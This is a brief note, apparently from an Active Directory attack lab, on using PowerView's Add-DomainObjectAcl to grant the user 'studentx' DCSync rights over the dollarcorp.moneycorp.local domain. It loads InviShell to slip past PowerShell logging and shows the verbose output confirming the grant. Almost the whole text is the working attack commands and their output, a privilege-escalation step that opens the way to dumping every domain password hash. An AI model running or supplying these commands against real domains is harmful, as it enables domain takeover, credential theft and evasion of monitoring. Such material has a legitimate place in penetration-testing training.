Using powerview to give yourself specific permissions


```
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

```
C:\Windows\system32>**C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat**    
[snip]
PS C:\Windows\system32>**. C:\AD\Tools\PowerView.ps1    ** 
PS C:\Windows\system32>**Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose**
[snip]
VERBOSE: [Add-DomainObjectAcl] Granting principal
CN=studentx,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local 'DCSync' on
DC=dollarcorp,DC=moneycorp,DC=local
[snip]
```

